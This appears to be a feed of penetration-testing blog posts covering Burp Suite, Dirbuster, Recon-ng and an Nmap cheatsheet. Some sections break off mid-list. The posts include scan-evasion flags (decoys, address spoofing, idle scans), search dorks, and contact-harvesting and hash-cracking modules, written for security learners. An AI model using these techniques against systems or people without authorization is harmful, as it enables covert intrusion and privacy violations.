    <content type="html"><![CDATA[<p>Yes, the time has come for a full post on Burp Suite! I have delayed it for too long!</p>

<p>Before starting, here are some resources for learning about Burp:</p>

<p><a href="https://portswigger.net/burp/help/contents.html">Burp Suite Documentation</a></p>

<p><a href="http://aetherlab.teachable.com/p/burp-suite">Free introductory course on Burp Suite</a></p>

<!-- more -->


<p>Burp Suite is the primary tool used for performing web application security assessments. It acts as a proxy between your browser and the target, and it comes packed with powerful features to assist in penetration testing: spidering fuctionality, web scanning for vulnerabilities (pro version only), tools that allow you to perform different actions with web requests (will be covered in detail below), and customization ability through plugins.</p>

<h1>Introduction to Burp Suite</h1>

<p>Burp is a Java application, so you need to have Java installed (version 1.6 or later) to run it. It comes pre-installed in Kali, where you can find it in the Web Application Analysis category.</p>

<p>To use Burp, you need to configure your browser&rsquo;s proxy settings. Burp&rsquo;s proxy is listening on 127.0.0.1:8080. If you want to manually configure your browser to use it, refer to this <a href="https://portswigger.net/burp/help/suite_gettingstarted.html">getting started post</a>. I recommend using a browser add-on like <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a> to set up your proxies and toggle them with a click.</p>

<p>For <strong>Burp to work with HTTPS</strong> requests, you need to add Burp&rsquo;s CA certificate to your browser. Go to <a href="http://burp/">http://burp/</a> and click on CA Certificate to download it to your computer. In this demo I&rsquo;m using Firefox, but the steps should be similar in the rest of the browsers. In the Firefox menu, select Options or Preferences, then go to Advanced &ndash;> Certificates &ndash;> View Certificates. Click on the Authorities tab and choose Import to select your CA certificate, and check the option &ldquo;Trust this CA to identify web sites&rdquo;. Then click Ok, and restart Firefox. Burp should work now with HTTPS traffic, without issuing any security warnings.</p>

<h1>Burp Suite components</h1>

<p>The power of Burp comes from the interaction between its components, which you can individually access from the application tabs. Let&rsquo;s see each of them in action!</p>

<h2>Target</h2>

<p>Here you can see information about your target. The site map constructs a hierarchical representation of your target. Items requested are shown in black, those that Burp inferred from links etc. are in gray. As you browse with the proxy on, Burp will keep building the site map.</p>

<p><img class="center" src="/images/tools/burp/sitemap.png" title="&lsquo;sitemap&rsquo; &lsquo;target sitemap&rsquo;" ></p>

<p>You can configure the scope of your targets from the Scope tab. Alternately, you can right-click on the sitemap entries to perform other actions:</p>

<p><img class="center" src="/images/tools/burp/sitemap-menu.png" title="&lsquo;sitemap menu&rsquo; &lsquo;target sitemap menu&rsquo;" ></p>

<p>Clicking on the Filter bar lets you customize filtering options. Before starting the demo, I added my target to the scope and selected to hide the out-of scope items for a clearer view.</p>

<p><img class="center" src="/images/tools/burp/sitemap-filter.png" title="&lsquo;sitemap filter&rsquo; &lsquo;target sitemap filter&rsquo;" ></p>

<h2>Proxy</h2>

<p>This is the component that allows you to intercept and modify the requests between your browser and the target. You will get familiar with the Intercept tab, where you can inspect each request and response, modify it, or send it to other tools. The history tabs keep records for the HTTP and WebSockets messages. In the Options tab you have a plethora of configuration options for your Proxy. Take special note of the Response Modification options, which you can use to automatically modify the responses HTML to remove client-side logic and controls, or perform SSL stripping.</p>

<p><img class="center" src="/images/tools/burp/proxy-options.png" title="&lsquo;proxy response options&rsquo; &lsquo;response modification options&rsquo;" ></p>

<p>Right-clicking in the Raw tab will give you more options, among which there are some very useful ones such as copying the request as a Curl command, or constructing selected strings in Javascript and SQL (MySQL, Oracle, MS-SQL)</p>

<h2>Spider</h2>

<p>You can use Burp&rsquo;s spider to automatically crawl target applications. After you&rsquo;ve manually browsed the application, right-click the host or URL that you want to crawl in the site map, and choose &ldquo;Spider this host / branch&rdquo;. Then watch the number of requests being made in the Control tab. You can customize the spider in the Options tab. Passive spidering is enabled by default, allowing Burp to update the site map while you are manually browsing. Also, you can specify what the spider should do when encountering forms (ignoring them, automatically submitting with pre-determined values, prompting for guidance etc.) Be careful, as the spider may perform actions with repercussions on the target application, so an initial manual assessment followed by a strict configuration of the spidering scope would be preferred.</p>

<h2>Scanner</h2>

<p>Burp has an automatic vulnerability scanner <em>uncontrolled drooling</em> that seems excellent from the reviews, but it&rsquo;s only available for Pro users. If you look in the Issue definitions tab, you can see the <a href="https://portswigger.net/KnowledgeBase/Issues/">vulnerabilites that Burp can detect</a>, among with a description for each of them <em>drooling intensifies</em></p>

<p><img class="center" src="/images/tools/burp/scanner.png" title="&lsquo;burp scanner&rsquo; &lsquo;burp web scanner&rsquo;" ></p>

<h2>Intruder</h2>

<p>With Burp Intruder you can perform highly-customized automated attacks against your targets, including brute forcing, fuzzing, enumeration etc. Usually, you select an interesting request and send it to Intruder. You can see the positions where payloads will be placed, marked in orange in this dummy request:</p>

<p><img class="center" src="/images/tools/burp/intruder-position.png" title="&lsquo;intruder positions&rsquo; &lsquo;intruder payload positions&rsquo;" ></p>

<h3>Attack types</h3>

<p>In the Position tab, you can also choose the type of attack you want to perform:</p>

<ul>
<li><p><strong>Sniper</strong> &ndash; single set of payloads, places each payload into each position in turn, useful for individual parameter fuzzing</p></li>
<li><p><strong>Battering ram</strong> &ndash; single set of payloads, places the the same payload into all positions at the same time</p></li>
<li><p><strong>Pitchfork</strong> &ndash; multiple payload sets, different payload set for each position</p></li>
<li><p><strong>Cluster bomb</strong> &ndash; multiple payload sets, tests all permutations of the payload combinations, so depending on your payloads, this attack might grow to gigantic proportions</p></li>
</ul>


<h3>Payload types</h3>

<p>You have lots of payload types available for testing, so choose what is appropriate for your target:</p>

<ul>
<li><p><strong>Simple list</strong> &ndash; list of strings</p></li>
<li><p><strong>Runtime file</strong> &ndash; read strings at runtime from a file (for very large lists)</p></li>
<li><p><strong>Custom iterator</strong> &ndash; permutations of characters in multiple lists</p></li>
<li><p><strong>Character substitution</strong> &ndash; substitute characters, for instance when you are testing for 53cur3 p455w0rd5</p></li>
<li><p><strong>Case modification</strong> &ndash; change the characters' case according to the pre-defined rules</p></li>
<li><p><strong>Recursive grep</strong> &ndash; recursively extract data from the responses of previous requests</p></li>
<li><p><strong>Illegal Unicode</strong> &ndash; by using illegal Unicode representations, it might be possible to bypass filters etc.</p></li>
<li><p><strong>Character blocks</strong> &ndash; creates blocks of characters of specified sizes, can aid in detecting buffer overflows</p></li>
<li><p><strong>Numbers</strong> &ndash; numeric payloads</p></li>
<li><p><strong>Dates</strong> &ndash; date values</p></li>
<li><p><strong>Brute forcer</strong> &ndash; sets of permutations generated from specified characters</p></li>
<li><p><strong>Null payloads</strong> &ndash; empty string payloads</p></li>
<li><p><strong>Character frobber</strong> &ndash; changes the value of each character in turn, useful for determining what characters are being used for session tokens etc.</p></li>
<li><p><strong>Bit flipper</strong> &ndash; flips individual bits in the payload</p></li>
<li><p><strong>Username generator</strong> &ndash; generates usernames from the given input</p></li>
<li><p><strong>ECB block shuffler</strong> &ndash; shuffles ECB-encrypted blocks</p></li>
<li><p><strong>Extension generated</strong> &ndash; uses an extension to create the payloads</p></li>
<li><p><strong>Copy other payload</strong> &ndash; copies the current payload value to a different position</p></li>
</ul>


<h2>Repeater</h2>

<p>This tool is useful for sending requests over and over to the target application.</p>

<p><img class="center" src="/images/tools/burp/repeater.png" title="&lsquo;repeater&rsquo; &lsquo;repeater&rsquo;" ></p>

<h2>Sequencer</h2>

<p>With the Sequencer tool you can test for the randomness of data tokens in an target application. The analysis is more accurate if the number of captured tokens is larger.</p>

<p><img class="center" src="/images/tools/burp/sequencer.png" title="&lsquo;Burp sequencer&rsquo; &lsquo;Burp sequencer&rsquo;" ></p>

<h2>Decoder</h2>

<p>The Decoder tool performs encoding and decoding of different data formats, such as HTML, URL, Base64, ASCII hex, Hex, Octal, Binary, Gzip, and it also has hashing functionality for MD2, SHA-224, MD5, SHA1, SHA-384, SHA, SHA-512 and SHA-256.</p>

<p><img class="center" src="/images/tools/burp/decoder.png" title="&lsquo;Burp decoder&rsquo; &lsquo;Burp decoder&rsquo;" ></p>

<h2>Comparer</h2>

<p>If you want to compare different responses, this tool gives you the options of words or bytes comparison</p>

<p><img class="center" src="/images/tools/burp/comparer.png" title="&lsquo;Burp comparer&rsquo; &lsquo;Burp comparer&rsquo;" ></p>

<h2>Extender</h2>

<p>Here you can add extensions to Burp that add more functionality than what is available by default. Take a look at what extensions you can find in the BApp Store:</p>

<p><img class="center" src="/images/tools/burp/extensions.png" title="&lsquo;burp extensions&rsquo; &lsquo;burp extensions&rsquo;" ></p>

<p>In this screenshot I am sorting by rating. There are many extensions available and I suggest looking at each and determining if you will need it before choosing to install.</p>

<h3>Burp Clickbandit</h3>

<p>We&rsquo;re done with the main tools, but Burp has more. It even includes a cool tool for creating clickjacking attacks.</p>

<p><img class="center" src="/images/tools/burp/clickbandit.png" title="&lsquo;burp clickbandit&rsquo; &lsquo;burp clickbandit&rsquo;" ></p>

<p>In a future post I will do a lab featuring Burp&rsquo;s capabilities that I&rsquo;ve enumerated so far. Expect some Mutillidae! :&ndash;)</p>

    <id>http://chousensha.github.io/blog/2016/09/12/pentest-tools-dirbuster</id>
    <content type="html"><![CDATA[<p>Dirbuster is a <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">multithreaded Java application</a> that tries to find hidden files and directories on a target web application by brute forcing their names. Dirbuster comes with <a href="https://github.com/digination/dirbuster-ng/tree/master/wordlists">9 lists</a> of common file and directory names that were crawled from the internet, but you can choose to use your own. Pure brute forcing is also available, but due to the time constraints, the filelist option is by far the most commonly used</p>

<!-- more -->


<p>As an aside, you might have probably noticed that lately I&rsquo;ve been writing less writeups and have been focusing more on tools and system administration fundamentals. I thought that in the long run, this approach would yield better and faster results, both in CTF challenges and in real-life hacking (bug bounties, I&rsquo;m looking at you). While I haven&rsquo;t used Dirbuster so much, I was inspired to write a post for it after reading <a href="https://blog.it-securityguard.com/bugbounty-decoding-a-%F0%9F%98%B1-00000-htpasswd-bounty/">this blog post on how it helped in acquiring a nice bounty</a></p>

<p>With that said, let&rsquo;s take a look at Dirbuster&rsquo;s interface:</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster.png" title="&lsquo;dirbuster&rsquo; &lsquo;dirbuster interface&rsquo;" ></p>

<p>This tool is not complicated to use, nor does it have tons of other functionality besides discovering hidden resources. However, from my (limited) experience with it, the default settings might not work in the majority of cases (causing crashes and so on). A bit of fine tuning is required to get the most of your dirbusting experience, and is this that I will be covering here.</p>

<h1>Dirbuster configuration</h1>

<p>The first thing you will do when starting Dirbuster is to select a wordlist to use. The lists that come with Dirbuster are located in <code>/usr/share/dirbuster/wordlists/</code> on a Kali machine.</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-lists.png" title="&lsquo;dirbuster lists&rsquo; &lsquo;dirbuster default lists&rsquo;" ></p>

<ul>
<li><p><strong>Work method</strong> &ndash; leave the Auto Switch selected for fastest results. Dirbuster will try a HEAD request first, saving more bandwidth and latency than it would with a straight on GET request.</p></li>
<li><p><strong>Number of threads</strong> &ndash; the default is 10, but in my own testing, I found this excessive, so I am now starting with 3-5 threads. Since the <em>Go Faster</em> option allows you to jump over 100 threads, you might think the faster the better, but I noticed that Dirbuster has a really thin line between slow but working and fast but crashed. Maybe it&rsquo;s the local vulnerable installations I tested against, but it seems logical to treat a live target with more caution than a lab..you don&rsquo;t want to DOS your target in your search for goodies.</p></li>
</ul>


<p>In your choice of wordlist, take a second to review the target and see if it uses case sensitive resources (for instance, try seeing if admin returns the same as Admin, use lowecase lists if target is a IIS web server etc.). This will help you decide what list is most appropriate for the job, and save you precious time.</p>

<p>Under the starting options, you will tweak things as needed, because there is no one-size-fits-all approach to these checkboxes. The <strong>standard start point</strong> considers directories as ending with a / slash, and files ending with the specified extension. It&rsquo;s best not to run with all the options checked at the same time, as this will take significant time and it may potentially crash the target. I separate the <em>Brute Force Directories</em> and <em>Brute Force Files</em> + <em>Use Blank Extension</em>. As always, the target dictates the weapon, so time constraints and the sensitivity of the target should also be taken into consideration for the <em>Be Recursive</em> option, which I toggle as necessary.</p>

<p>The <strong>URL fuzz</strong> option allows you to enter the words in the lists directly in the URL, in a template like manner. An example offered by Dirbuster is  <code>test.html?url={dir}.asp</code>, where the content in curly brackets will be substituted for the words in list.</p>

<h2>Dirbuster Options</h2>

<p>In the Options tab, you can further tweak your Dirbuster installation.</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-options.png" title="&lsquo;dirbuster options&rsquo; &lsquo;dirbuster options&rsquo;" ></p>

<ul>
<li><p><strong>Follow redirects</strong> &ndash; I check this, but it does come with an overhead increase, you might want to leave it unchecked and manually navigate to interesting places that were found</p></li>
<li><p><strong>Parse HTML</strong> is on by default, and it lets Dirbuster read the HTML and look there for other files and folders that it won&rsquo;t have to guess</p></li>
</ul>


<p>In the Advanced options, there a few more tabs you can configure. The Dirbuster Options tab allows you to set some default values so you don&rsquo;t have to change them each time you start the application.</p>

<p>In the HTML Parsing tab you can configure which HTML elements to extract links from, along with file extensions that should not be processed.</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-html.png" title="&lsquo;dirbuster html options&rsquo; &lsquo;dirbuster html parsing&rsquo;" ></p>

<p>The Authentication tabs covers authentication options for Basic, Digest and NTLM authentication. In the HTTP Options tab you might want to spend a few moments to change the blatantly conspicuous user agent. Also, note the <em>Run through a proxy</em> option, which is available if you want to..well, run Dirbuster through a proxy. It&rsquo;s also possible to add custom headers, maybe you want to add a cookie to use Dirbuster as an authenticated user. That might be risky if your user privileges allow you to perform certain actions on the target, so you might want to restrict other options in this case (maybe you don&rsquo;t want to follow all the links in case one of them does something you really wouldn&rsquo;t want to, and so on).</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-http.png" title="&lsquo;dirbuster http options&rsquo; &lsquo;dirbuster http options&rsquo;" ></p>

<p>Finally, there&rsquo;s the Scan options tab. I chose to decrease the default <em>Connection Timeout</em> value from 30 to 10 seconds and to limit the number of requests per second. You can also see the failcase string that Dirbuster uses to determine if a resource is actually there or not.</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-scan.png" title="&lsquo;dirbuster scan options&rsquo; &lsquo;dirbuster scan options&rsquo;" ></p>

<p>After running a scan, you can see the results found, including the HTTP response code and the size. I ran a test scan against Mutillidae with threads blazing for the demo:</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-results.png" title="&lsquo;dirbuster scan results&rsquo; &lsquo;dirbuster scan results&rsquo;" ></p>

<p>You can also see the results in a tree view, for better readability:</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-tree.png" title="&lsquo;dirbuster tree&rsquo; &lsquo;dirbuster tree results&rsquo;" ></p>

<p>This concludes the post on Dirbuster. Despite being unmaintained (not sure if that&rsquo;s a word), it&rsquo;s still the go-to application for files and folders discovery. Use it early in the recon process (after you took a look at the target to know which settings to apply) for best results!</p>

    <link href="http://chousensha.github.io/blog/2016/08/29/pentest-tools-recon-ng/"/>
    <updated>2016-08-29T15:30:18-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/08/29/pentest-tools-recon-ng</id>
    <content type="html"><![CDATA[<p>In this post I&rsquo;ll discuss the use of the powerful web reconaissance framework, Recon-ng.</p>

<p><a href="https://bitbucket.org/LaNMaSteR53/recon-ng">Recon-ng is a full-featured Web Reconnaissance framework written in Python. Complete with independent modules, database interaction, built in convenience functions, interactive help, and command completion, Recon-ng provides a powerful environment in which open source web-based reconnaissance can be conducted quickly and thoroughly.</a></p>

<!-- more -->


<p>Recon-ng is an invaluable tool for performing information gathering. It is modeled on the Metasploit framework, so the interface and functionality are pretty similar.</p>

<p><img class="center" src="/images/tools/recon-ng.png" title="&lsquo;recon-ng&rsquo; &lsquo;recon-ng&rsquo;" ></p>

<h1>Recon-ng core commands</h1>

<p>With the help menu, you can get an overview of what commands are available:</p>

<p>``` plain
[recon-ng][default] > help</p>

<h2>Commands (type [help|?] <topic>):</h2>

<p>add             Adds records to the database
back            Exits the current context
delete          Deletes records from the database
exit            Exits the framework
help            Displays this menu
keys            Manages framework API keys
load            Loads specified module
pdb             Starts a Python Debugger session
query           Queries the database
record          Records commands to a resource file
reload          Reloads all modules
resource        Executes commands from a resource file
search          Searches available modules
set             Sets module options
shell           Executes shell commands
show            Shows various framework items
snapshots       Manages workspace snapshots
spool           Spools output to a file
unset           Unsets module options
use             Loads specified module
workspaces      Manages workspaces
```</p>

<p>You can already see the similarity with Metasploit. Let&rsquo;s focus on what&rsquo;s exclusive to to Recon-ng, the powerful recon capabilities. You can leverage different search engines and social media for information gathering. To leverage the most of this functionality, you will need to use API keys. Below you can see the available APIs:</p>

<p>``` plain
[recon-ng][default] > keys list</p>

<p>  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  |        Name       | Value |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  | bing_api          |       |
  | builtwith_api     |       |
  | facebook_api      |       |
  | facebook_password |       |
  | facebook_secret   |       |
  | facebook_username |       |
  | flickr_api        |       |
  | fullcontact_api   |       |
  | google_api        |       |
  | google_cse        |       |
  | instagram_api     |       |
  | instagram_secret  |       |
  | ipinfodb_api      |       |
  | jigsaw_api        |       |
  | jigsaw_password   |       |
  | jigsaw_username   |       |
  | linkedin_api      |       |
  | linkedin_secret   |       |
  | pwnedlist_api     |       |
  | pwnedlist_iv      |       |
  | pwnedlist_secret  |       |
  | shodan_api        |       |
  | twitter_api       |       |
  | twitter_secret    |       |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
```</p>

<p>In addition to the well known APIs of the main search engines and social media, there are the following:</p>

<ul>
<li><p>the BuiltWith Domain API, which provides XML and JSON access to the technology information of a website</p></li>
<li><p>FullContact lets you easily query by email, phone number, or Twitter username. Results include publicly- available social profiles, photos, basic demographics, job titles, company stats, and over 100 other public data points.</p></li>
<li><p>IPInfoDB, which provides free access to IP geolocation tools</p></li>
<li><p>Jigsaw is an online directory of free, downloadable Company information and more than 11 million business Contacts. Every Jigsaw business Contact is complete with hard-to-find direct dials and email addresses, while each Company record gives the low down on Company size, location, and industry.</p></li>
<li><p>PwnedList is designed for consumers to check if their email address has been found on commonly circulating lists of stolen accounts and passwords (this has been shut down at the time of this writing)</p></li>
</ul>


<p>If you were to add a new API key, you could do it like this:</p>

<p>``` plain
[recon-ng][default] > keys add bing_api 007007
[*] Key &lsquo;bing_api&rsquo; added.
[recon-ng][default] > keys list</p>

<p>  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
  |        Name       | Value  |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
  | bing_api          | 007007 |
```</p>

<p>To delete an API key, you can use the <code>keys delete</code> command.</p>

<p>To see what items are available in the framework, use the <strong>show</strong> command:</p>

<p>``` plain
[recon-ng][default] > show
Shows various framework items</p>

<p>Usage: show [banner|companies|contacts|credentials|dashboard|domains|hosts|leaks|locations|modules|netblocks|options|ports|profiles|pushpins|schema|vulnerabilities]
```</p>

<p>This should give you an idea of the kinds of data you can look for. Again, this should feel similar to Metasploit. In fact, like in the msfconsole, the modules are what you will use to perform different tasks. Let&rsquo;s take a look at all the currently available modules. Oh, and did I mention there is tab completion as well? :D</p>

<p>You can select a module via the <strong>load</strong> or <strong>use</strong> commands. Once in a module&rsquo;s context, you can see information about it with the <code>show info</code> command. Similarly, you can see the required options for a module with the <code>show options</code> command, and change them with <strong>set</strong>. Let&rsquo;s look at each module and see some usage examples</p>

<h2>Discovery</h2>

<ul>
<li><p>DNS Cache Snooper &ndash; Uses the DNS cache snooping technique to check for visited domains</p></li>
<li><p>Interesting File Finder &ndash; Checks hosts for interesting files in predictable locations</p></li>
</ul>


<p>Let&rsquo;s see more about this module:</p>

<p>``` plain
[recon-ng][default][interesting_files] > show info</p>

<pre><code>  Name: Interesting File Finder
  Path: modules/discovery/info_disclosure/interesting_files.py
Author: Tim Tomes (@LaNMaSteR53), thrapt (thrapt@gmail.com), Jay Turla (@shipcod3), and Mark Jeffery

<p>Description:
  Checks hosts for interesting files in predictable locations.</p>

<p>Options:

<p>Comments:
  * Files: robots.txt, sitemap.xml, sitemap.xml.gz, crossdomain.xml, phpinfo.php, test.php, elmah.axd,

- inurl:elmah.axd ext:axd intitle:"Error log for"
- inurl:server-status "Apache Status"
</code></pre>

<p>```</p>

<p>I found this a bit confusing at first, but the SOURCE is the equivalent of the target you do recon on. I ran this on my own blog for a demo. When setting a target, keep in mind not to include the http or https (the protocol setting handles that), and also to exclude the trailing slash (I got errors until I did that).</p>

<li><p>MailTester Email Validator &ndash; Leverages MailTester.com to validate email addresses</p></li>
<li><p>Contact Name Mangler &ndash; Applies a mangle pattern to all of the contacts stored in the database, creating email addresses or
usernames for each harvested contact. Updates the &lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Contact Name Unmangler &ndash; Applies a regex or unmangle pattern to all of the contacts stored in the database, pulling out the
individual name components. Updates the &lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Have I been pwned? Breach Search &ndash; Leverages the haveibeenpwned.com API to determine if email addresses are associated with breached
credentials. Adds compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>

<li><p>Adobe Hash Cracker &ndash; Decrypts hashes leaked from the 2013 Adobe breach. First, the module cross references the leak ID to
identify Adobe hashes in the &lsquo;password&rsquo; column of the &lsquo;creds&rsquo; table, moves the Adobe hashes to the
&lsquo;hash&rsquo; column, and changes the &lsquo;type&rsquo; to &lsquo;Adobe&rsquo;. Second, the module attempts to crack the hashes
by comparing the ciphertext&rsquo;s decoded cipher blocks to a local block lookup table (BLOCK_DB) of
known cipher block values. Finally, the module updates the &lsquo;creds&rsquo; table with the results based on
the level of success.</p></li>
<li><p>PyBozoCrack Hash Lookup &ndash; Searches Google for the value of a hash and tests for a match by hashing every word in the resulting
page using all hashing algorithms supported by the &lsquo;hashlib&rsquo; library. Updates the &lsquo;credentials&rsquo;

    <updated>2016-07-31T06:40:43-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/31/nmap-cheatsheet</id>
    <content type="html"><![CDATA[<p>Recently, I&rsquo;ve been reading Fyodor&rsquo;s <a href="https://www.amazon.com/Nmap-Network-Scanning-Official-Discovery/dp/0979958717">Nmap Network Scanning</a> book and decided to create an Nmap cheatsheet while at it.</p>

<p>Half of the book, including updated content, is also available for free on <a href="https://nmap.org/book/toc.html">https://nmap.org/book/toc.html</a></p>

<p>Fyodor was also nice enough to set up a machine that you can test your scans against (within reasonable limits), at <a href="http://scanme.nmap.org/">http://scanme.nmap.org/</a></p>

<p>All right, let&rsquo;s get scanning!</p>

<!-- more -->


<h1>Commands cheatsheet</h1>

<h2>Scan types</h2>

<p><strong>-sS</strong>: TCP SYN scan &ndash; the default scan, most popular due to its speed and stealth, as it doesn&rsquo;t complete a TCP connection</p>

<p><strong>-sT</strong>: TCP Connect scan, it uses the connect() system call, used by unprivileged users who can&rsquo;t send raw packets or when scanning IPv6 targets</p>

<p><strong>-sV</strong>: Version detection, omit for performance increase and/or stealth</p>

<p><strong>-sA</strong>: TCP ACK scan, can&rsquo;t tell if the ports are open or closed, but it can determine whether firewall rules are stateful or stateless</p>

<p><strong>-sW</strong>: TCP Window scan, same as ACK, but it can determine open and closed ports on certain systems</p>

<p><strong>-sM</strong>: Maimon scan, yet another special scan type for bypassing firewalls</p>

<p><strong>-sU</strong>: UDP scan. You can improve it by adding a version scan alongside it (but it will be slower)</p>

<p><strong>-sF</strong>: FIN scan, sets the FIN bit, useful in bypassing some firewalls and determining the target&rsquo;s OS between Windows and Unix types, as it doesn&rsquo;t work against Windows</p>

<p><strong>-sX</strong>: Xmas scan, another option for firewall evasion, sets the FIN, PSH, and URG flags, creating the impression of a lit Christmas tree</p>

<p><strong>-sN</strong>: Null scan, doesn&rsquo;t set any flags, an additional option to evade pesky firewalls</p>

<p><strong>-sO</strong>: IP protocol scan, check which IP protocols are supported on the target</p>

<p><strong>-b <FTP relay host></strong>: FTP bounce scan, also available to unprivileged users</p>

<p><strong>-A</strong>: Enable OS detection, version detection, script scanning, and traceroute</p>

<h3>Host discovery</h3>

<p><strong>List scan &ndash; sL</strong> &ndash; enumerates the addresses in the specified range and does reverse DNS lookup on them. Good for getting a feel about the targets by checking their DNS names, and maintaining a low profile on the network (because no ping requests are being sent yet, so it&rsquo;s stealthier)</p>

<p><strong>-p-</strong>: Shortcut for <em>-p1-65535</em></p>

<p><strong>-Pn</strong>: Treat all hosts as online &mdash; skip host discovery (disable ping)</p>

<p><strong>&mdash;exclude &lt;host1[,host2][,host3],&hellip;></strong>: Exclude hosts/networks</p>

<p><strong>-n</strong>: Never do DNS resolution</p>

<p><strong>-sP</strong>: perform a ping sweep</p>

<p><strong>-PS/PA/PU</strong>: TCP SYN ping/TCP ACK ping/UDP ping &ndash; various host discovery options for bypassing firewalls</p>

<h3>Performance</h3>

<p><strong>-T&lt;0-5></strong>: Set timing template (higher is faster). -T4 (aggressive) is recommended for most cases, as it improves performance and optimization for a fast and reliable network. For evasion purposes you can use T0 (paranoid) or T1 (sneaky), but speed will be very slow. To conserve bandwidth and resources you may use T2 (polite), at another significant expense of speed. T3 is the normal mode, and T5 is an insane level of speed (but you might sacrifice some accuracy in the process)</p>

<p><strong>-F</strong>: Fast scan, only scan most common 100 ports</p>

<h3>Evasion</h3>

<p><strong>-D &lt;decoy1,decoy2[,ME],&hellip;></strong>: Cloak a scan with decoys</p>

<p><strong>&mdash;scanflags <flags></strong>: Customize TCP scan flags. You can couple it with specifying a TCP scan type to give Nmap a base of interpreting the results</p>

<p><strong>-S &lt;IP_Address></strong>: Spoof source address</p>

<p><strong>-sI <zombie host[:probeport]></strong>: Idle scan, a complex scan that is stealthy but slow. It uses zombies to perform the scan, without sending packets directly from your IP. Use in tandem with the -PN option to disable ping and not disclose your real address. Avoid -sV, as version detection would also make your IP visible to the target</p>

<p><strong>-f; &mdash;mtu <val></strong>: fragment packets (optionally w/given MTU), can aid in bypassing firewalls that don&rsquo;t handle fragmentation well</p>

<p><strong>-g/&mdash;source-port <portnum></strong>: Spoof source port, bypass security measures that rely only on checking the source port</p>

<p><strong>&mdash;spoof-mac <mac address/prefix/vendor name></strong>: Spoof your MAC address</p>

<p><strong>&mdash;badsum</strong>: Send packets with a bogus TCP/UDP/SCTP checksum. Normal hosts discard packets with bad checksums, but firewalls may omit these checks for performance reasons</p>

<p><strong>&mdash;dns-servers &lt;serv1[,serv2],&hellip;></strong>: Specify custom DNS servers when doing reverse DNS lookup to avoid your DNS server showing up in the target&rsquo;s logs</p>

<h3>Additional info</h3>

<p><strong>-v</strong>: increase verbosity level, you can use it 2 or 3 times to further increase verbosity</p>

<p><strong>-d</strong>: Increase debugging level (use -dd or more for greater effect), can increase to a max of 9</p>

<p><strong>&mdash;packet-trace</strong>: print summary of every packet sent and received</p>

<h3>Output</h3>

<p><strong>-oN/-oX/-oS/-oG <file></strong>: Output scan in normal, XML, sCrIpt kIddi3, and Grepable format, respectively, to the given filename</p>

<p><strong>-oA <basename></strong>: Output in the three major formats at once</p>

<p><strong>&mdash;resume <filename></strong>: Resume an aborted scan</p>

<p>If you don&rsquo;t want Nmap to display its interactive output, you can pass a <em>&ndash;</em> to the format type(s), like so: <code>-oS &ndash;</code></p>

<h2>Useful tips</h2>

<ul>
<li><p><code>nmap -sL -n target</code> &ndash; list IPs to be scanned before actually scanning them</p></li>
<li><p><code>-pT:22,80,U:53</code> &ndash; scan separate TCP and UDP ports (you have to specify a UDP scan in addition to a TCP scan)</p></li>
<li><p><code>&mdash;version-intensity <level></code>: Set from 0 (light) to 9 (try all probes), setting it to 0 will limit the version detection to the most likely to succeed probes, and improve the speed of the scan</p></li>
<li><p>you can scan a network range by adding the subnet mask after an IP like so: <em>ip/numbits</em>. An example would be: 192.168.80.0/24, where the hosts between 192.168.80.0 and 192.168.80.255 would be scanned</p></li>
<li><p>version detection is noisy</p></li>
<li><p>you can specify port 0 for a scan, to catch malicious software that might listen on it</p></li>
</ul>


<h2>Script scanning</h2>

<p><strong>-sC</strong>: enable some common scripts, may be intrusive to the target</p>

<p><strong>&mdash;script</strong>=<Lua scripts>: <Lua scripts> is a comma separated list of directories, script-files or script-categories</p>

<p><a href="https://nmap.org/book/nse-usage.html">Currently defined categories</a> are:</p>

<ul>
<li><p><em>auth</em> &ndash; operations requiring authentication credentials</p></li>
<li><p><em>broadcast</em> &ndash; local network broadcasts</p></li>
<li><p><em>brute</em> &ndash; brute force attacks</p></li>
<li><p><em>default</em> &ndash; scripts that are run by default with -sC or -A options</p></li>
<li><p><em>discovery</em> &ndash; additional network information and enumeration</p></li>
<li><p><em>dos</em> &ndash; denial of service scripts</p></li>
<li><p><em>exploit</em> &ndash; exploitation of some specific vulnerability</p></li>
<li><p><em>external</em> &ndash; information may be sent to a third-party database or service</p></li>
<li><p><em>fuzzer</em> &ndash; fuzzing scripts</p></li>
<li><p><em>intrusive</em> &ndash; may crash the target system, consume excessive resources, or be perceived as malicious</p></li>
<li><p><em>malware</em> &ndash; test if the target is infected by malware or backdoors</p></li>
<li><p><em>safe</em> &ndash; general network discovery scripts that re unlikely to be resource intensive, crash a system, or lit the target logs on fire</p></li>
<li><p><em>version</em> &ndash; scripts that run only with -sV enabled</p></li>
<li><p><em>vuln</em> &ndash; check for specific vulnerabilities</p></li>

<p>Many thanks to Fyodor for creating such an awesome tool and freely sharing with everyone! As you can see, Nmap is so much more than just a port scanner. You can easily perform some sort of vulnerability analysis and exploitation with it, and if there is no task that you would like Nmap to do and it can&rsquo;t, you can write the code yourself and contribute to this amazing project.</p>

